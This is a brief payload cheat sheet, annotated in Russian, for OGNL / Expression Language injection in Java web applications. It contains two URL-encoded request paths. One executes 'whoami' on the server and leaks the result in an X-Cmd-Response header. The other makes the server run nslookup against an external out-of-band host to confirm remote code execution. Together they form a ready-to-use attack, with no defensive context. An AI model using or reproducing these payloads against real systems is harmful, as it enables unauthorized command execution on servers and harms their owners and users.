# OGNL / Expression Language Injection (Java)

### Запрос 1
```http
/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
```
Действие: выполняет whoami и выводит результат в HTTP-заголовок X-Cmd-Response.

### Запрос 2
```http
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20d8n4tfp9gkq3ff7rr6ege4wo3wg1eh11h.oast.site%22%29%7D/
```
Действие: выполняет nslookup на внешний хост (подтверждение RCE).
